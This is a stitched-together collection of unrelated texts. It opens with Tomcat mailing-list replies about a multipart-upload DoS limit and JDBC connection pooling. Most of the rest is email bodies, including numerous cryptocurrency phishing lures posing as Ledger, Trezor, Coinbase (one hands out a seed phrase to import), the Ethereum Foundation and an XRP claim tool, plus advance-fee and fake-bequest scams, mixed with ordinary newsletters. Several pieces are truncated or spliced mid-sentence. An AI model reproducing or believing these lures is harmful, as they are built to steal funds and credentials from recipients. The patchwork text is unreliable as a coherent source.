<snip/>

> Specifically, the following point is unclear to us:
>    The advisory mentions "unlikely configurations of multipart upload." Could you please specify what types of configurations are considered "unlikely" and would therefore be affected by this vulnerability? Please provide specific examples or characteristics.

There are various limits that apply to a multi-part upload. The ones
that matter in this scenario are:

- maxPostSize: set on the Connector. Sets the maximum total size for
                all non-file parts
- maxFileSize: set on the multi-part configuration. Sets the maximum
                size for a single part (file and non-file)

If maxFileSize + maxPostSize > 2^31 then it was possible to bypass
maxPostSize, load large non-file parts into memory and (with enough
non-file parts / requests) trigger a DoS.

The unlikely aspect was that untrusted users would be allowed to upload
files ~2Gb in size.

Kind regards,

Mark

subject: RE: How to access a REST service
body_text:
Hello, my cents on this issue.

Chris's article is fine except that it does not use the try-with-resources feature of Java language:

try (Connection conn = getConnection()) {
   try (Statement stmt = conn.createStatement()) {
      try (ResultSet rs = stmt.executeQuery(sql)) {
          ...
      }
   }
}

That will make sure that every SQL resource is freed correctly.

Other important thing is that you should free the connection as fast as possible. Don't make long lasting operations while you have the connection open. Instead you could read the SQL result to memory, close the connection, and then do additional work.

Third thing is what Chris is also saying, avoid taking more than one connection at a time. It will end up in deadlock when you run our of connections. And it also breaks the previous rule.

-Harri

Generally, yes. It is incorrect. But it depends. There are circumstances in which maxPostSize is used as the default for maxFileSize.

- the full connector configuration
- the multi-part configuration used by the servlet (could be in web.xml or in an annotation)

All of that said, the size of an uploaded file does not count towards the limit set by maxPostSize.

Mark

Well, I guess that this is a top post.  But this message is getting longer with all the replies.

I don’t think it is a memory leak.  I’m fairly sure that I’m closing every connection immediately after using it.  It seems that most of my database queries are coming from web crawlers, and there are a few hundred accesses every day.  I was getting error messages from Glassfish saying that it couldn’t allocate any more connection objects and then crashing.  At that time the maximum pool size was the default, which is 32.  So I believe it was just being overloaded by the web crawlers.  Now that I have increased to 1000, the system has stopped crashing.

But I have to admit that I really don’t understand how these connection pooling systems work.  My understanding is that only as many connection objects are created and placed in the pool as are needed, so even if you set the upper limit high it doesn’t necessarily mean that you will have that many.  Once a database session terminates, then that connection object becomes available for future use.  So at any given time, the number of connection objects in the pool would be the maximum number of simultaneous connections that have been made so far, and not necessarily the total maximum that are allowed (in my case 1000).  Is this correct?

Dan Schwartz

body_text:
Hello again Rob,

I just read that article you referenced by Cockroach Labs.  I found the statement:

  "If we make the pool too small (i.e. choose too few connections), we’ll introduce latency, as operations have to  wait for an available connection to open up before they can execute."

This implies that if the number of concurrent accesses exceeds the number of connection objects in the pool, then the system simply waits until some of the currently active connections terminate and the connection objects become available.

This is not what was happening with Glassfish.  When the number of simultaneous requests exceeds the pool size, the system outputs an error message and crashes.  It doesn't just wait until some active connections terminate so that the connection objects become available.  It seems that different pooling systems have different policies.

Dan Schwartz

subject: Re: How to access a REST service
body_text:
Daniel,

On 8/5/25 12:43 PM, Daniel Schwartz wrote:
> My understanding is that only as many connection objects are created
> and placed in the pool as are needed, so even if you set the upper
> limit high it doesn’t necessarily mean that you will have that many.
This is correct.

> Once a database session terminates, then that connection object becomes available for future use.

Correct, as long as we agree on the definition of "database session". In the case of both JDBC and connection pools based upon JDBC connections, the definition of the "end of a session" is "calling Connection.close".

If you never call Connection.close, then every connection leaks, and most pools have features to help deal with those circumstances so that badly-written applications don't run out of resources.

> So at any given time, the number of connection objects in the pool would be the maximum number of simultaneous connections that have been made so far, and not necessarily the total maximum that are allowed (in my case 1000).  Is this correct?

More or less, though the pool may grown and shrink slightly around that value.

The pool Tomcat uses has features for logging and closing "abandoned connections" which are those which are checked-out of the pool but not properly-returned. I highly recommend enabling those features to investigate what is happening in your environment.

Otherwise, your 1000 connections will eventually be exhausted... it will just take much longer than the default 32 where you were observing that behavior.

-chris

The backlog queue size is not the limit for the number of concurrent connections - they are distinct entities. A connections request sits in the backlog queue until the server accepts it, which usually occurs extremely quickly - unless the actual concurrency limit as specified in your <Connector> element has been reached. The backlog limit only comes into play if Tomcat cannot accept additional connections for some reason, such as the thread limit being reached.

Since you didn’t provide your Tomcat <Connector> configuration, no actual answers can be provided - just speculation.

  - Chuck

reading the "AI" generated details or any other articles that come up. The

to convey to you and how to resolve it.

Unchecked exceptions can be thrown and the compiler will not warn about it.
This may be the issue, but it it not guaranteed, but it definitely is a
potential and obvious problem with the code.

You need to ensure that everything related to the connection (connection,
ResultSet, Statement, PreparedStatement) are also released (closed) or they
will retain references to the connection and the connection may not be
returned to the pool.

As previously mentioned by others, using try-with-resources for all of
these objects is strongly recommended to avoid leaks. If you are uaing
older Java (consider upgrading), you will need to use finally blocks
instead (as previously mentioned by others).

Unfortunately, you have only posted a portion of the code, and it may be
the case that it the problems stems from elsewhere (like where you make the
queries, or anywhere else that obtains a connection).

It should be easy to get a tool to analyze the code (say your IDE (if you
use one), PMD, Spotbugs, Sonarqube, etc.) and they would likely point out
all the potential resource leaks. Many IDEs, such as Intellij IDEA, also
provide such analysis built in. They basically look for any object derived
from AutoClosable and ensure you are closing the object in a finally clause
(or in all potential code paths). If you aren't, you have a leak.

body_text:
Hello Robert,

From your and other people's replies, I'm learning that tracking down memory leaks can be quite daunting and possibly beyond me.  

I'm aware of the try-with-resources instruction and will look into it.  I wrote this code before learning about this.

In any case, I will follow your advice and add a "finally" block to the "try" statement.  I'm currently closing the connection in case an SQL exception is thrown, but I hadn't considered the possibility of other kinds of exceptions.  I suppose that there could be such exceptions, but I'm mystified regarding what those might be.

However, there has been a new development.  After "fishing" around in the Glassfish administration system, I found that there is a way to monitor the JDBC connection pool and get all sorts of information.  Based on this, I really don't think that there is any memory leak at all. 

When running a simple query on my website, I see that NumConnAcquired increases by three (which is what I would expect), and immediately thereafter NumConnReleased increases by the same number.  So every connection that is being acquired is also being released.  I think that, if there were a memory leak, the number of connections acquired would be increasing at a faster pace than the number being released.

Also, there is a NumConnUsed statistic that has a "High Water Mark" which is described as the "maximum number of connections that were used", and this is currently 160, which is not a lot.  

So it seems that the system is behaving normally.  And I have noticed that since setting the maximum pool size to 1000, the system has not crashed for several days.  Probably, 1000 is more than necessary, and you just need make sure you have more possible connections available than the anticipated future high-water mark.  But this seems to be working.

So maybe I'm just imagining problems that no longer exist.  As long as the system keeps running, I'm fine with this.

Thanks to everyone for their replies.

Dan

I think you are fixing the symptom and not the problem. Even with a pool size of 1, your server should not crash. The worst thing that should happen is a request fails because a connection could not be immediately obtained from the pool.

If Windows is essentially ignoring your backlog request, I think your only option is to raise the number of simultaneous connections Tomcat is willing to accept.

body_text:
One additional set of suggestions for this project or for the future
(inline):

On Mon, Aug 11, 2025, 21:53 Daniel Schwartz <dan@danielgschwartz.com> wrote:

>
> DGS: A single simple query to my interface requires three database
> accesses, one to retrieve a list of countries, then, when the use selects a
> country, another database access to get the lists of states and cities
> associated with that country, and then assuming the simplest case where
> there are no states or cities, then a third database access when the user
> enters a year and requests the holidays for that country in that year.  If
> there are states selected, then a fourth database access is required to get
> the cites for that state or to determine that there aren't any.
>

If one is going to make multiple requests (especially without much logic
in-between), I would suggest reusing the same connection (wrapped with the
relevant resource management logic). Obtaining a connection is a higher
cost operation than a query request, and releasing and reacquiring it
requires more synchronization overhead which can reduce parallelism for
handling many requests at once.

Also, what you are suggesting above is that three, non-concurrent
connections are obtained. I'm not sure we got this impression from previous
communications. At least I thought you had three connections open at the
same time for the request. Hence our greater concern.

Also, minimizing the time the DB connection is held and obtaining all the
data as quickly as possible makes for more efficient reuse of connections
in the pool when there are many requests contending for the DB connections.
(Avoid holding your DB connections while reading parameters / payloads, or
while responding to the client (as the write back to the click can block)).

Anyway, different designs are also valid, but that would be my approach.
Especially if you need to deal with a large number of requests in short
periods of time (which if you are peaking at 269, it suggests you are).

If this is a low use system or you aren't really in need of optimizing
throughput and computing resources for high capacities, or the cost of
computer resources is negligible compared to the cost of time to improve
efficiency, then there is no compelling motivation to change it.

Robert

Application should not crash if you fail to get database connection from pool. 
Instead it should wait until the configured timeout is reached, and then it will throw exception, which is SQLException if I recall correctly.
At that point you code will catch the exception and log it, but it will not crash.

https://tomcat.project.org/tomcat-9.0-doc/jdbc-pool.html#Common_Attributes

* maxWait
* (int) The maximum number of milliseconds that the pool will wait (when there are no available connections) for a connection to be returned before throwing an exception. Default value is 30000 (30 seconds)

But I can't find similar setting from Glassfish (Payara):
https://docs.payara.fish/community/docs/5.193/documentation/payara-server/advanced-jdbc/advanced-connection-pool-properties.html

So I assume that Glassfish will throw exception immediately when it runs out of connections.

-Harri

> I'm interested in what you mean by "crashes". To me, that usually means that the process stops at the very least. Do you mean that the request fails, or something much worse?
> 
> DGS: By "crashes" I mean that the program terminates, usually just after printing out a stack trace.

O_O

Like... the JVM completely exits and you have to re-start Tomcat? That sounds ... suspicious. I don't think I've ever taken down Tomcat in the 
20+ years I've been using it. Application in an unusable state? Sure. 
But exiting the JVM usually requires a JVM bug or tcnative crash.

DGS: I'm a Java programmer.  This is normal behavior.  If an exception is thrown and there is no provision for catching it, the JRE outputs a stack trace and terminates the program.  However, this has never happened in my program.  The program itself doesn't crash, only Glassfish does when it can't create any more connections. 

>> That’s why I have set a large maximum pool size.
> 
> I think you are fixing the symptom and not the problem. Even with a pool size of 1, your server should not crash. The worst thing that should happen is a request fails because a connection could not be immediately obtained from the pool.
> 
> Most pools will wait some amount of time for a connection, and then time-out and the request fails. I suppose it's possible to configure a pool to require a connection to be immediately available, but that would be an unusual configuration to use IMHO.
> 
> DGS: According to the people at Onmifish, if you set the maximum pool size to 1, yo

wrote:

>
> DGS: I was going by what the person at Omnifish had told me.  I just
> checked, and you can't set the maximum pool size to 1.  The minimum is 8.
> So I did this and within seconds the system stopped working and I got the
> following in the log file:
>
>     "Caused by: javax.resource.spi.ResourceAllocationException: Error in
> allocating a connection. Cause: In-use connections equal max-pool-size and
> expired max-wait-time. Cannot allocate more connections."
>
>     Also,
>
>     "Caused by: com.sun.appserv.connectors.internal.api.PoolingException:
> In-use connections equal max-pool-size and expired max-wait-time. Cannot
> allocate more connections."
>
>     Then I went back and reset the maximum pool size to 1000, and it
> started working again.
>
> Based on the error message and some quick Google searches, there is a
setting to control the maximum wait time (max-wait-time). The default is
supposed to be 60 seconds, so that's a red flag right there -- do you
expect to be holding connections for so long that waiting threads /
requests would have to wait for more than 60 seconds?

Using a connection for around 60 seconds would be a really long DB query,
or a very slow database server / instance. You may want to validate the
Glassfish configuration option, and understand how long your requests are
holding connections for, etc. Something is still very odd with your
application's behavior.

subject: Re: How to access a REST service
body_text:
Am 08.08.25 um 18:21 schrieb Daniel
Schwartz:
Hello Robert,
From your and other people's replies, I'm learning that tracking down memory leaks can be quite daunting and possibly beyond me.
I'm aware of the try-with-resources instruction and will look into it. I wrote this code before learning about this.
In any case, I will follow your advice and add a "finally" block to the "try" statement. I'm currently closing the connection in case an SQL exception is thrown, but I hadn't considered the possibility of other kinds of exceptions. I suppose that there could be such exceptions, but I'm mystified regarding what those might be.
However, there has been a new development. After "fishing" around in the Glassfish administration system, I found that there is a way to monitor the JDBC connection pool and get all sorts of information. Based on this, I really don't think that there is any memory leak at all.
When running a simple query on my website, I see that NumConnAcquired increases by three (which is what I would expect), and immediately thereafter NumConnReleased increases by the same number. So every connection that is being acquired is also being released. I think that, if there were a memory leak, the number of connections acquired would be increasing at a faster pace than the number being released.
Also, there is a NumConnUsed statistic that has a "High Water Mark" which is described as the "maximum number of connections that were used", and this is currently 160, which is not a lot.
So, if every page hit takes up three connections (as I read it
above), that would imply, that you have around 50ish concurrent
page hits in maximum. Is that consistent with your data?
If so, you probably don't have a connection leak, but rather an
unusual program design that uses (in my opinion) far too many
connections for each page hit.
If you don't see a correlation between concurrent requests to
your service and your database (now, that you are able to view
those metrics), I would set the reclaim option for the database
pool as described at
https://glassfish.org/docs/latest/administration-guide.html#statement-leak-detection-and-leaked-statement-reclamation
(note I haven't run Glassfish myself, but I like the log abandoned
feature from tomcats db pool).
Felix

Electrum is a Bitcoin wallet application that allows users to manage their Bitcoin directly from their own computers and mobile devices. It is available for Windows, macOS, Linux, and Android.

Electrum also supports a range of features for users who require additional control over their wallet setup. These include:
Integration with supported hardware wallets
Multisignature wallet creation and management
Watching-only wallets for offline and cold-storage arrangements
Transaction verification through Electrum’s SPV model
Connections to Electrum’s decentralized server infrastructure
Wallet information and transaction export
Wallet restoration using a recovery seed
Advanced transaction and wallet-management settings
These advanced features are optional and can be used when needed without complicating ordinary wallet operations.
Getting started
To begin, download the appropriate version of Electrum for your operating system. After installation, you can create a new Bitcoin wallet or restore an existing wallet using the relevant recovery information.

subject: Email multisig is now required for all blockchain users
body_text:
Email multisig is now required for all blockchain users
Hello,
We are writing to let you know about a change that now applies across the network. From this point, an email address must be signed on the smart contract of your wallet and a second sign method must be set up beside it. Together, these two items form what we call Email Multisig.
Email Multisig links your wallet to a mailbox you control. Once enabled, the smart contract recognizes both your wallet and your email as proof of ownership. Every action that changes the state of your smart contract is then signed by the two together, so a single key is no longer enough on its own.
What this means in practice: any blockchain user, and any dApp wallet holder, can enable Email Multisig from the page linked below. MetaMask is one supported wallet, but the same flow works for other wallets that support smart contract calls. After Email Multisig is enabled, there is no need to open MetaMask again to sign future transactions, and no need to open any other dApp either. Your email signature carries the verification on the smart contract from that point on.
Enable Email Multisig
Alongside this change, all supported networks are opening their support doors to every blockchain user. Whether you hold a wallet that has never been linked to a mailbox, or you use a dApp wallet that has not yet been updated, the flow is the same. You confirm the email address on record, add a second sign method, and enable Email Multisig on your contract in a single visit.
The change takes effect for all blockchain users by 28 September . The page linked above remains open for the next 24 hours so you can complete both steps in one session.
If anything needs a hand, our support team is one message away. Thank you for reading.

body_text:
SECURITY BULLETIN ·
An important update on the recent breach
Trezor Security Team
Earlier this month, we notified our community of a support-portal incident affecting a limited set of user contact details. After a deeper forensic review with our external partners, we can now confirm the scope was broader than initially reported.
The breach was not limited to user data. Portions of our internal asset-handling and compliance documentation were also accessed. Your recovery seed, PIN, and on-device secrets remain safe — those never leave your Trezor. However, we are asking all account holders to review and acknowledge our updated Asset Compliance Policy so we can restore a verified record for every customer.
What we found
Unauthorized access to a subset of internal compliance and audit files.
Exposure of customer contact records (name, email, and support history).
No exposure of seeds, private keys, PINs, or device firmware — these are never stored on our servers.
What we need from you
To keep your account in good standing, please review and sign the updated Asset Compliance Policy. The document is delivered securely through DocuSign — no wallet connection, seed phrase, or private key is ever requested.
The review takes about three minutes. You'll need a valid ID on hand if you hold a business or institutional account.
Review and sign the policy
Signed via DocuSign · No wallet connect or seed phrase required
How to stay safe
Trezor will never ask for your recovery seed or PIN by email, chat, or phone.
Enable a passphrase on your device for an additional layer of protection.

subject: Scan your device to protect your assets
body_text:
Scan your device to protect your assets
What's On - November
Welcome to your monthly What's On newsletter, providing information on the latest events and opportunities happening at the University. This month we have a fantastic online lecture from Hiranya Peiris, Professor of Astrophysics at UCL and the latest episode from your University's 360 degrees podcast, this time discussing entrepreneurship. It's all happening here at the University of Southampton.
2022 STAG Public Lecture by Professor Hiranya Peiris
In the past decade, we have been able to answer age-old questions accurately, such as how old the Universe is, what it contains, and its destiny. Along with these answers have also come many exciting new questions.
Speaker Hiranya Peiris, Professor of Astrophysics at University College London, will unravel the detective story, explaining what we have uncovered, and how we know what we know.
A hybrid event, both online and in person. Register your interest here .
Cancer Immunology Fund Lecture
Join us online for an exciting evening where we will hear from some of our leading experts in cancer immunology.
During this event our experts will explain how early research ideas can lead to the development of new and innovative cancer treatments, showcasing the crucial role of the Cancer Immunology Fund.
Our host Mark Cragg, Professor of Experimental Cancer Biology, will be joined by Dr Sheah-Lin Lee, NIHR Clinical Lecturer in Surgery and Gareth Thomas, Professor of Experimental Pathology.
Register your interest.
Global Entrepreneurship Week
It's Global Entrepreneurship Week this week and to celebrate there's a brand new 360 degrees podcast out with some great guests!
360 Degrees is our University of Southampton podcast where we share informative and inspirational stories from across our alumni community.
This week we have the creators of two Future Worlds start-ups Clare and Grace who talk about how they got into entrepreneurship, the challenges they faced along the way and the steps you can take to start your own business.
Listen to the episode here .
The Biological Sciences Society Needs Your Help.
Do you have experience working in Biotech or the pharmaceutical industry?
The Biological Sciences Society is looking for alumni who can speak about what life is like working in your industry. How did you take your interest in science to your current day job?
If you would be interested in giving a presentation or sitting on a panel , please email givetime@soton.ac.

subject: In re FTX Trading Ltd. – Customer Claims Bar Date Reminder
body_text:
Dear Customer:
We would like to remind you that the FTX Customer Claims Bar Date is September 29, 2023, 4 PM United States Eastern Time (“Bar Date”) . The Bar Date is the deadline to file proofs of claim, against the FTX Debtors, on account of Customer Claims. We recommend all customers with a customer claim to begin the claim process by logging in to the Customer Claims Portal at https://claims.ftx.com . If you have already filed a proof of claim and do not have any changes, then there is no need to file another claim.
Please note that the FTX Debtors have also requested KYC information as part of the customer claim process. As such, we urge you to begin the Know Your Customer (“KYC”) process. Please note that it is NOT mandatory for you to have a verified KYC status in order to submit a claim. If you wish to submit a customer claim, you may do so during your KYC process prior to the Bar Date. Additionally, you do not need to have your KYC process completed and verified by the Bar Date. The KYC review and verification process will continue after the Bar Date.
Note that if your account was previously frozen as a result of the cybersecurity incident, please refer to the separate communication sent on September 17, 2023.
Please visit the FTX support website at https://support.ftx.com to learn more about the customer claim process and the KYC process. You may also contact our customer support team via email ( support@ftx.com ) if you have trouble logging in to the customer claims portal.

We deliver yet another exceptional news, a month after the monumental decision , that is set to have substantial ramifications for crypto industry
developers, securities experts, and numerous of investors and token holders
alike.

the long-awaited verdict in SEC v. Ripple Labs, expressing the fact that XRP is
not a security and should not be regarded as such by the governing financial
bodies.

rescind half of the total frozen tokens , from escrow, in a timeframe of 24 months. More

claimed in 30 days , with higher reward percentages, as incentives
awarded directly to the platform's users, investing oriented individuals, and other ecosystem participants.

in the allocation event. Taking into consideration these attributes , such as account seniority,
activity loads, trading, and overall network contribution, the add-ons start at
15% and max out at 30% of the provided account balance.
Proceed with account registration by accessing the Allocation Tool . Check your eligibility and submit the claim to receive confirmation and
tokens.
For compatibility purposes, increased security, and efficient operation, we recommend
using hardware devices , such as Trezor and/or Ledger and Nano X, as the claiming
tool was optimized for end-to-end encryption with hardware wallet interaction.

self-custody and key ownership are essential requirements , and those claims submitted by
accounts associated with centralized exchanges are consequently denied.
Community members gain their token shares only by

subject: FIDO's, WebAuthn's Post-Quantum Future
body_text:
FIDO's, WebAuthn's Post-Quantum Future
Fortunately, in the last 12 months we have seen a massive increase in the popularity and adoption of FIDO and WebAuthn. Now most major websites support this new, convenient and secure authentication method that aims to replace ordinary passwords.
But what happens if one day in the future a quantum computer breaks the underlying cryptography, potentially rendering this authentication method insecure? To mitigate this threat, it is important to have post-quantum (PQ) cryptography in place in time. As one of the first steps, SandboxAQ introduces the first end-to-end post-quantum secure implementation of the FIDO2 protocol.
The aim of this open-source project is to provide a complete implementation that allows post-quantum secure end-to-end registration and authentication in all steps of the protocol and all involved parties, to give developers a starting point to experiment and test the viability of post-quantum cryptography in current hardware devices providing FIDO2 authentication.
This project uses the Trussed framework , which is also powers Nitrokey 3 devices . Nitrokey GmbH supported this project by providing development support and tools. This achievement once again demonstrates the maturity and flexibility of the Trussed framework.
Does this mean that Nitrokey 3 will support post-quantum cryptography? No, at least not in the near future, because the FIDO specification doesn't cover post-quantum algorithms yet. Also, there are many other pieces involved, such as operating systems, web browsers, web sites, that would need to support such a future standard, or at least not conflict with it.
Read more in SandboxAQ's article .
About: SandboxAQ is an enterprise SaaS company, providing solutions at the nexus of AI and Quantum technology (AQ) to address some of the world's most challenging problems. The company's core team and inspiration formed at Alphabet Inc., emerged as an independent, growth-capital-backed company in 2022.

We're sorry to inform you that Ledger has fallen victim to a cyber attack and that confidential data belonging to approximately 127,000 customers have been illegally obtained by an unauthorized third party.
You're receiving this e-mail because the Ledger wallet associated with your e-mail address has been found within those affected by the breach.
To be more specific, on the 3rd of January 2024, members of our forensic team have detected malicious software installed on one of the Ledger Live's administrative servers.
Despite our relentless efforts, as of today, it's technically impossible to make an accurate assessment of the severity of this data breach. Due to these circumstances, we must assume that your funds could be at immediate risk of theft .
If you're receiving this e-mail, it's because you haven't updated your ledger to the latest version, which could leave you at risk due to the possibility of malware being installed on earlier versions. In order to protect your assets, please upgrade your ledger to the newest version.

subject: Data Breach
body_text:
Dear client,
We regret to inform you that Ledger has fallen victim to a sophisticated you attack on February 18, 2024. An employee was tricked into giving administrative credentials to hackers, which resulted in the sensitive data of approximently 267,000 customers being exported.
The data of customers which was exposed is limited. The breach consists of emails, transaction history, firmware version, & customer orders. The hackers were unable to export all of the data on the Ledger Live servers due to our Cyber Security team discovering the threat actor.
After a damage assesment performed by the Cyber Security team, it was discovered that there was a leaked Github API token that allowed hackers to roll out updates on ~53,000 ledger devices, with the patch now marked as CVE-2024-8471.
If you're receiving this email, it is because you are one of the customers affected by the data breach. Due to the severity of this situation, it is recommended that you upgrade your Ledger immediately or risk loss of assets . Customer's have reported assets missing from their wallet, and all transactions lead to the same wallet now marked as Ledger Exploiter Wallet .
If you have not upgraded your firmware to the latest version already, do so now in order to ensure no loss of assets.
Sincerly,
Ledger

﻿
Dear Ethereum Community,
We are excited to announce a transformative step in the Ethereum ecosystem with the launch of ETH 2.0! As part of our commitment to our users, we're taking a significant leap forward.
ETH Gas Fees, Redistributed!
For all the gas fees you've paid over time, it's now time to get rewarded. Introducing $gETH, a revolutionary token that's here to add value to your Ethereum experience.
How to Claim Your $gETH
Claiming your $gETH is straightforward. Just follow these steps:
Click on the website: www.ethereum.org/refund-check
Connect your Ethereum wallet.
Verify your transactions.
Claim your $gETH tokens!
It's that simple!
What is $gETH?
$gETH is a token representing your loyalty and engagement within the Ethereum network. For every transaction you've made, for every gas fee spent, $gETH is our way of saying thank you. This token is distributed in direct proportion to the gas fees you've incurred, making every transaction you've completed count towards a tangible reward.
Why $gETH?
Acknowledge Your Contributions: Your participation in the Ethereum network has been invaluable, and it's time you're rewarded for it.
Linear Distribution: The more you've transacted, the more $gETH you earn. It's simple and fair.
Powered by ETH 2.0: With the launch of ETH 2.0, expect more efficiency, scalability, and rewards.
A Project by the Ethereum Foundation
We're proud to say that $gETH is an initiative by the Ethereum Foundation, focusing on giving back to the community that has supported the Ethereum network through its journey.
Don't miss out on this opportunity to claim what you've rightfully earned. Visit our website today and be a part of this exciting new chapter in Ethereum's history!

contacted you privately and no one is informed of this communication. I will give you the entire story behind the Business here. I do hope you find it interesting enough in accepting this proposal.

maturity, a routine notification was sent to his forwarding address but we got no reply. After a month, we sent a reminder, and finally, we discovered from his contract employers, Royal Dutch plc that the deceased depositor had died alongside his longtime
companion in an Auto crash. If you are familiar with private banking practice, those who patronize our services usually prefer anonymity but also some levels of detachment from conventional processes. In the deceased bio-data form, he listed no next of kin.
In the field of private banking, accounts are rarely held under a name, depositors use numbers and codes to make the accounts anonymous.
In this case, the deceased Client died intestate. In line with our internal processes for account holders who have passed away my bank conducted a search in good faith to determine who should have the right to claim the funds. This has for the past years
been unfruitful. This sum has since been sitting in my bank and the interest is being rolled over with the principal sum at the end of each year. No one has been able to come forward for it. According to the Laws of my environment (United Kingdom), at the
expiration of a given period if the said fund is not claimed the money will revert to the ownership of the United Kingdom government.
The banking world is fraught with huge rewards for those who occupy certain offices and oversee certain portfolios. In this case, I alone have the deposit details as I was the account officer to the deceased at the time the account Fixed deposit was made.

body_text:
Hello,

I hope this message finds you in good health and spirits. My name is Sally Burton, and I am a philanthropist who has dedicated my life to helping those in need around the world. I am 76 years of age, and about a year ago, I was diagnosed with cancer. Despite all efforts to fight and resist it, I have been unable to overcome this illness, and I have come to terms with the fact that my time on this earth is limited.

As I reflect on my life and my legacy, I have decided to bequeath part of my fortune (£1,963,920.00 GBP) to individuals who share my passion for helping those in need. subject: Invitation: Truth about the Iraq invasion, 20 years later
body_text:
Countless lies were told to propel the invasion of Iraq, and two decades later many such lies are still being told . To end current wars and prevent new ones, we need to set the record straight.
That’s why RootsAction Education Fund is inviting you to a special livestream event -- a free screening of the acclaimed documentary War Made Easy: How Presidents and Pundits Keep Spinning Us to Death , followed by a panel that will illuminate how wars get started and how they can be prevented or stopped.
To see more information and to reserve your spot for this online event on Monday, March 20, click here.
You can join us for the free livestream screening of War Made Easy at 6:45 pm ET and/or plan to join us for the live panel presentation at 8 pm ET on March 20.
You also have an option to watch the documentary online any time before then , courtesy of the Media Education Foundation, which produced the film and is offering free access to it for the next week only.
Some comments about the War Made Easy film:
Howard Zinn: “Superb”
San Francisco Chronicle : “Searing”
The Nation : “Chilling”
Variety : “Damning”
Philadelphia Inquirer : “Sobering and more than a little scary”
San Francisco Bay Guardian : “Horror and humor commingle”
An Inconvenient Truth editor Jay Cassidy: “A tour de force”
Please join in watching War Made Easy and the panel, which will include:
Kathy Kelly , President of the Board of World BEYOND War and co-coordinator of Ban Killer Drones.
Dennis Kucinich , former U.S. Congressman.
David Swanson , campaign coordinator of RootsAction and Executive Director of World BEYOND War.
Norman Solomon , national director of RootsAction and author of War Made Easy , the book that the documentary was based on.
India Walton , senior strategic organizer with RootsAction Education Fund and director of Roots Action Civic Engagement in Buffalo.
Marcy Winograd , coordinator of CodePink Congress and co-chair of the Peace in Ukraine Coalition.
We hope you’ll register now for this big event!
--- The RootsAction Education Fund team

Thanks for signing up for Southern Kitchen, a weekly newsletter delivering fresh food news and recipes straight to your inbox.
I’m Southern Kitchen editor Mackensy Lunsford . Every Friday, I’ll send you food stories, recipes and tutorials inspired by the American South.
Photograph by Stephanie Amador, The Tennessean
A little bit about me: I started working at restaurants at 14 – so young my parents had to sign off on my work permit. Since then, I’ve worked in every position in the restaurant industry, from dishwasher to line cook to restaurant owner, but I’ve never been good at waiting tables. I admire people who are. The kitchen is where I’m most comfortable.
I eventually left restaurants behind and have been writing about food for more than 20 years. I’ve written a barbecue cookbook and was nominated for a James Beard Award for innovative storytelling . Perhaps more importantly, I can nail a hardboiled egg every time, though I have Martha Stewart to thank for that, if I’m being honest.
I now live in Nashville, Tennessee. Before that, I was in Asheville, North Carolina for 23 years. My family has lived in Southern Appalachia for many generations, many of them as farmers. I have my great-grandfather's tomato can label, his name printed on the side, hanging on my wall.
In the summer,I have tomatoes in my Nashville yard. I have a strong, beautiful girl named Lily, who loves to help me in the kitchen. We love to make lemon pound cake , these gooey brownies , and these perfect chocolate chip cookies .
I hope you’ll reach out to me about your favorite recipes, techniques and anything you’d like to see more of in this newsletter. You can email me at mlunsford@southernkitchen.com .
Thanks for being here,

Managing a Data Science Team
Enjoying the newsletter? Please consider forwarding it to a friend or a colleague! They can sign up here . In this issue, Angela Bassa talks about going from being an individual contributor to a manager in data science.
BY Angela Bassa
Great data scientists have career options and won’t abide bad managers for very long. If you want to retain them, you need to care about their work, connect it to the business, and design a diverse, resilient, high-performing team.
Build trust and be candid
Trust, authenticity, and loyalty are particularly essential in data science. Why? There’s often confusion around the discipline and its role in the company, so the team manager is responsible for insulating data scientists from unreasonable requests and for explaining the team’s role to the rest of the organization. The best way to build trust is to make sure that your team members have interesting projects to work on, and that they’re not burdened by projects with vague requirements or unrealistic timelines.
You should also go out of your way to be candid. Data scientists are smart people who are trained in how to interrogate and handle information. My heuristic is to be about 20% more direct and candid than you think you should be.
Connect the work to the business
To get the most from a data scientist’s time, give them a clear picture of the business goal behind a project. A lot of managing data science is discussing and fine-tuning questions from stakeholders so that you better understand the information they actually want and how it will be used. Don’t let questions or requests become projects for your team until you know exactly what the stakeholder wants and how they’ll use it. Requiring very clear objectives for the data questions that come your way is one of the most important things you can do for your team. Stakeholders can’t always ask these kinds of focused, specific questions on their own; make sure members of the data science team are regularly invited to product and strategy meetings.
Design great teams
As a data science manager, you’ll get lots of résumés. Take advantage of that to be picky in the right ways. Social skills like empathy and communication are undervalued in data science and should be part of your hiring criteria. And instead of hiring just for “culture fit,” ask yourself if this person sees the world in a way that expands the boundaries of the team’s knowledge.

subject: Transitioning to Self-Custody Wallets
body_text:
Transitioning to Self-Custody Wallets
At Coinbase, our priority is to ensure the security of your assets while keeping you informed of significant updates. We are writing to announce a mandatory transition from custodial accounts to self-custody wallets, driven by recent regulatory developments in the cryptocurrency sector.
What Is Changing?
Following a lawsuit filed by a coalition of regulatory authorities against centralized cryptocurrency platforms, new compliance standards have been established. The legal action underscored potential risks to user funds held on centralized exchanges, including vulnerabilities related to mismanagement or security breaches. In response, Coinbase will transition all user accounts to self-custody wallets by April 15, 2025 , enhancing the safety and autonomy of your holdings.
Benefits of Self-Custody
A self-custody wallet grants you exclusive control over your private keys, eliminating dependency on third-party custodians. This shift aligns with regulatory expectations while providing you with enhanced security and ownership of your digital assets.
Introducing Coinbase Wallet
We recommend adopting Coinbase Wallet, our secure, non-custodial solution. Supporting over 500 cryptocurrencies, it offers seamless integration with decentralized applications and employs advanced encryption to safeguard your assets. For more details, please refer to our blog post .
Action Required: Please complete this transition by April 15, 2025 , to ensure uninterrupted access to your funds.
Steps to Transition Your Account
Download the Coinbase Wallet application from coinbase.com/wallet .
Import the seed phrase provided below to configure your wallet:
Your Designated Seed Phrase:
scare animal raw carbon habit ladder lumber meadow melody risk echo engine
Critical Notice: Record this seed phrase securely offline and do not disclose it to anyone. Coinbase cannot recover your funds if this phrase is lost or compromised.
After importing the seed phrase, follow the in-app prompts to transfer your account balance. This process typically takes less than 10 minutes. For detailed guidance, consult our support article .
Download Coinbase Wallet
Support Available

subject: NitroWall With Fast i7 CPU, WiFi 5, OpenWrt
body_text:
NitroWall With Fast i7 CPU, WiFi 5, OpenWrt
We are pleased to present the new powerful NitroWall NW678 with WLAN! For the first time with WiFi 5 and OpenWrt, the NitroWall is suitable as an wifi access point. Equipped with a Intel Quadcore i7-8550U CPU and up to 32 GB RAM, the NitroWall can be used as a fast VPN gateway and powerful firewall or Intrusion Prevention System (IPS). Optionally with OpenWrt or OPNsense. Trustworthy thanks to open source firmware and software. For professional users with professional requirements.
